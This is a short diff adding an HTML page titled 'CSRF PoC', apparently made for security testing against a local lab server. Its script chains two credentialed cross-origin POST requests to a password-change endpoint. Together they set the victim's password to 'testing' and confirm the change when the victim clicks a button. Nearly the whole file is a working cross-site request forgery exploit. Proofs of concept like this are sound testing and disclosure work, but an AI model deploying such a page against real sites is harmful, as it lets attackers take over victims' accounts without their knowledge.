@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+
+<head><title>CSRF PoC</title></head>
+
+<body>
+
+<script>
+function change(){
+	x=new XMLHttpRequest();
+	x.open('POST', 'http://192.168.29.8:5500/changepwd', true);
+	x.withCredentials = true;
+	x.onreadystatechange=function(){
+		if (x.readyState==4){
+			console.log('asd');
+			
+			y=new XMLHttpRequest();
+			y.onreadystatechange=function(){
+				if (y.readyState==4 & y.status==200){
+				alert("Password changed successfully!!!");
+				}
+
+			};
+			y.withCredentials=true;
+			y.open('POST', 'http://192.168.29.8:5500/changepwd', true);
+			
+			body2="confirmchange=Yes";
+			y.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+			y.send(body2);
+			
+		}
+	};
+	
+	
+	body="new_password=testing&confirm_password=testing";
+	x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	x.send(body);
+
+}
+</script>
+
+<button onclick="change()">Click</button>
+</body>
+
+
+</html>
